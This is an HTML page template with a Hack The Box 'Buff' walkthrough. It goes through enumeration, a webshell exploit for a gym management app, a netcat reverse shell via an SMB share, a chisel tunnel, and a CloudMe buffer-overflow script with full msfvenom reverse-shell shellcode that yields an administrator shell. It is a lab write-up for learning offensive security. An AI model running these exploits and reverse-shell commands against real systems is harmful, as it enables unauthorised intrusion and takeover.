@@ -1,0 +1,244 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Buff</h1>
+    <p class="text">Difficulty Easy | UserDifficulty : 3.7</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+└─$ <u>sudo nmap -sU -top-ports=100 --min-rate=2000</u>
+All 100 scanned ports on 10.129.135.249 are in ignored states.
+Not shown: 100 open|filtered udp ports (no-response)</code></pre></div>
+
+
+<p class="text">HTTP and unknown port 7680 is open on the target machine. I'll enumerate HTTP server first.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/buff/1-home.png' %}" alt="">
+    <p class="text">There seems to be no interesting information on this page, however, we can infer that the page uses some application like CMS because there is login input on the top right. <br><br> It's not rare case that other page include application name and version number. Therefore, I will browse around this page before enumerating directories with gobuster.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/buff/2-app.png' %}" alt="">
+    <p class="text">As I thought, there is a software name and version number on <u>contact.php</u>. Let's google if there is any CVE.</p>
+</div>
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">I discovered <a href="https://www.exploit-db.com/exploits/48506">this</a> exploit code. Let's try this.</p>
+
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ <u>python2 48506.py http://10.129.135.249:8080/</u>
+            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> whoami
+�PNG
+▒
+buff\shaun
+
+C:\xampp\htdocs\gym\upload></code></pre></div>
+
+<p class="text">We got command line with shaun. However, we can't use it like real command line because this payload uses simple webshell. It's just mimicking CLI, but not actual one. Therefore, we have to create stable reverse shell.</p>
+
+
+<p class="text">We can do it with nc64.exe. You can use python3 -m http.server for serving nc file, but I reccomend you to use <u>impacket-smbserver</u> for more stable connection. Also, if you are using UDP-openvpn, you better to swith to <u>TCP-version vpn</u> because the size of packet for linux and windows are huge different, and it's often fail to exchange them, results in error during file exchanges.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a
+└─$ nc -lvnp 4444 <u class="green">#on another tab</u></code></pre></div>
+
+<div class="code-box"><pre><code>C:\xampp\htdocs\gym\upload> net use \\10.10.16.40\share /user:a a
+C:\xampp\htdocs\gym\upload> copy \\10.10.16.40\share\nc64.exe \programdata\nc.exe
+C:\xampp\htdocs\gym\upload> C:\ProgramData\nc.exe -e cmd 10.10.16.40 4444</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.135.249] 49974
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload> </code></pre></div>
+
+<p class="text">We got reverse shell with user shaun. You can find user flag in C:\Users\shaun\Desktop\user.txt.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>C:\Users\shaun\Downloads> dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\Users\shaun\Downloads
+
+14/07/2020  13:27    &lt;DIR>          .
+14/07/2020  13:27    &lt;DIR>          ..
+16/06/2020  16:26        17,830,824 CloudMe_1112.exe
+               1 File(s)     17,830,824 bytes
+               2 Dir(s)   9,835,102,208 bytes free</code></pre></div>
+
+<p class="text">While enumerating user directory, I found not default exe file. It can be leveraged for privilege escalation.</p>
+
+
+<p class="text">Quick research with 'CloudMe_1112.exe vulnerability' revealed <a href="https://www.exploit-db.com/exploits/48389">this</a> exploit code. However, it uses socket library and the target IP is 127.0.0.1, which is localhost. Therefore, the exe file is running on the target machine, and it would open port becuase it is Cloud service namely. Let's confirm it.</p>
+
+
+<div class="code-box"><pre><code>C:\Users\shaun\Downloads>netstat -an | findstr "LISTENING"      
+netstat -an | findstr "LISTENING"                               
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
+  TCP    10.129.135.249:139     0.0.0.0:0              LISTENING
+  <u>TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING</u>
+  <u>TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING</u>
+  TCP    [::]:135               [::]:0                 LISTENING
+  TCP    [::]:445               [::]:0                 LISTENING
+  TCP    [::]:7680              [::]:0                 LISTENING
+  TCP    [::]:8000              [::]:0                 LISTENING
+  TCP    [::]:8080              [::]:0                 LISTENING
+  TCP    [::]:49664             [::]:0                 LISTENING
+  TCP    [::]:49665             [::]:0                 LISTENING
+  TCP    [::]:49666             [::]:0                 LISTENING
+  TCP    [::]:49667             [::]:0                 LISTENING
+  TCP    [::]:49668             [::]:0                 LISTENING
+  TCP    [::]:49669             [::]:0                 LISTENING</code></pre></div>
+
+<p class="text">I found open localhosts on 3306 and 8888. Because 3306 is used for sql generally, we can conclude 8888 is used for CloudMe_1112.exe. Let's create tunnel and exploit it.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a
+C:\Users\shaun\Downloads> net use \\10.10.16.40\share /user:a a
+C:\Users\shaun\Downloads> copy \\10.10.16.40\share\chisel.exe \ProgramData\chisel.exe</code></pre></div>
+
+<p class="text">Copy chisel file for windows like before we moved nc file...</p>
+
+<div class="code-box"><pre><code>└─$ chisel_1.11.3_linux_amd64 server -p 8002 --reverse
+C:\Users\shaun\Downloads> C:\ProgramData\chisel.exe client 10.10.16.40:8002 8888:127.0.0.1:8888</code></pre></div>
+
+<p class="text">And establish tunnel with chisel.</p>
+
+<div class="code-box"><pre><code>└─$ netstat -tulnp      
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp6       0      0 :::8002                 :::*                    LISTEN      202361/./chisel_1.1 
+tcp6       0      0 :::8888                 :::*                    LISTEN      202361/./chisel_1.1 </code></pre></div>
+
+
+<p class="text">And confirm the tunnel is open.</p>
+
+<div class="code-box"><pre><code>import socket
+
+target = "127.0.0.1"
+
+padding1   = b"\x90" * 1052
+EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
+NOPS       = b"\x90" * 30
+
+#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
+payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
+payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
+payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
+payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
+payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
+payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
+payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
+payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
+payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
+payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
+payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
+payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
+payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
+payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
+payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
+payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
+payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"
+
+overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	
+
+buf = padding1 + EIP + NOPS + payload + overrun 
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target,8888))
+	s.send(buf)
+except Exception as e:
+	print(sys.exc_value)</code></pre></div>
+
+<p class="text">This is simple BOF. Also, it uses msfvenom for paylaod. We can replace the payload with reverse shell, and get connection with privileged user.</p>
+
+<div class="code-box"><pre><code>└─$ <u>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.40 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload</u>
+payload =  b""
+payload += b"\xbd\xab\x99\x0e\xb3\xdb\xc0\xd9\x74\x24\xf4"
+payload += b"\x5a\x33\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc"
+payload += b"\x03\xc1\x97\xec\x46\xe9\x40\x72\xa8\x11\x91"
+payload += b"\x13\x20\xf4\xa0\x13\x56\x7d\x92\xa3\x1c\xd3"
+payload += b"\x1f\x4f\x70\xc7\x94\x3d\x5d\xe8\x1d\x8b\xbb"
+payload += b"\xc7\x9e\xa0\xf8\x46\x1d\xbb\x2c\xa8\x1c\x74"
+payload += b"\x21\xa9\x59\x69\xc8\xfb\x32\xe5\x7f\xeb\x37"
+payload += b"\xb3\x43\x80\x04\x55\xc4\x75\xdc\x54\xe5\x28"
+payload += b"\x56\x0f\x25\xcb\xbb\x3b\x6c\xd3\xd8\x06\x26"
+payload += b"\x68\x2a\xfc\xb9\xb8\x62\xfd\x16\x85\x4a\x0c"
+payload += b"\x66\xc2\x6d\xef\x1d\x3a\x8e\x92\x25\xf9\xec"
+payload += b"\x48\xa3\x19\x56\x1a\x13\xc5\x66\xcf\xc2\x8e"
+payload += b"\x65\xa4\x81\xc8\x69\x3b\x45\x63\x95\xb0\x68"
+payload += b"\xa3\x1f\x82\x4e\x67\x7b\x50\xee\x3e\x21\x37"
+payload += b"\x0f\x20\x8a\xe8\xb5\x2b\x27\xfc\xc7\x76\x20"
+payload += b"\x31\xea\x88\xb0\x5d\x7d\xfb\x82\xc2\xd5\x93"
+payload += b"\xae\x8b\xf3\x64\xd0\xa1\x44\xfa\x2f\x4a\xb5"
+payload += b"\xd3\xeb\x1e\xe5\x4b\xdd\x1e\x6e\x8b\xe2\xca"
+payload += b"\x21\xdb\x4c\xa5\x81\x8b\x2c\x15\x6a\xc1\xa2"
+payload += b"\x4a\x8a\xea\x68\xe3\x21\x11\xfb\x06\xbc\x09"
+payload += b"\xd3\x7e\xc2\x29\x32\x23\x4b\xcf\x5e\xcb\x1d"
+payload += b"\x58\xf7\x72\x04\x12\x66\x7a\x92\x5f\xa8\xf0"
+payload += b"\x11\xa0\x67\xf1\x5c\xb2\x10\xf1\x2a\xe8\xb7"
+payload += b"\x0e\x81\x84\x54\x9c\x4e\x54\x12\xbd\xd8\x03"
+payload += b"\x73\x73\x11\xc1\x69\x2a\x8b\xf7\x73\xaa\xf4"
+payload += b"\xb3\xaf\x0f\xfa\x3a\x3d\x2b\xd8\x2c\xfb\xb4"
+payload += b"\x64\x18\x53\xe3\x32\xf6\x15\x5d\xf5\xa0\xcf"
+payload += b"\x32\x5f\x24\x89\x78\x60\x32\x96\x54\x16\xda"
+payload += b"\x27\x01\x6f\xe5\x88\xc5\x67\x9e\xf4\x75\x87"
+payload += b"\x75\xbd\x86\xc2\xd7\x94\x0e\x8b\x82\xa4\x52"
+payload += b"\x2c\x79\xea\x6a\xaf\x8b\x93\x88\xaf\xfe\x96"
+payload += b"\xd5\x77\x13\xeb\x46\x12\x13\x58\x66\x37"</code></pre></div>
+
+<p class="text">Replace payload part with this generated one. Also don't forget to add <u>import sys</u> line to the top of the python file. Then, exploit with below...</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 443 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.135.249] 49978
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></code></pre></div>
+
+<p class="text">We've got administrator user. You can find root flag in <u>C:\Users\Administrator\Desktop</u>.</p>
+
+
+</body>
+</html>
+
